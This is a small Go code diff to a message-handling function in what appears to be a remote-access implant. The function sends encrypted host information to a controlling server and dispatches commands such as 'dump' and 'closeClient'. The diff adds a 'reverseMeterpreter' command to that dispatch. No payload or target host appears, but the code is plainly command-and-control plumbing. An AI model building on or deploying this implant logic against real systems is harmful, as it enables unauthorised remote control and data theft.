@@ -15,12 +15,11 @@ func SettleMsg(message string) {
 		common.ClientId = common.GetClientId(message)
 		hostInfo := listopt.GetHostInfo()
 		data, _ := crypto.Encrypt([]byte(hostInfo), []byte(config.AesKey))
-		common.SendSuccessMsg("Server", common.ClientId, "hostInfo", data)
+		common.SendSuccessMsg("Server", common.ClientId, "hostInfo", data, "")
 		common.Uptime = time.Now().Format("2006/01/02 15:04:05")
 		return
 	}
 	msg, sendUserId, data := common.SettleRetDataBt(message)
-
 	switch msg {
 	case "closeClient":
 		setchannel.CmdMsgChan <- message
@@ -119,6 +118,9 @@ func SettleMsg(message string) {
 		setchannel.CmdMsgChan <- message
 		return
 	case "dump":
+		setchannel.CmdMsgChan <- message
+		return
+	case "reverseMeterpreter":
 		setchannel.CmdMsgChan <- message
 		return
 
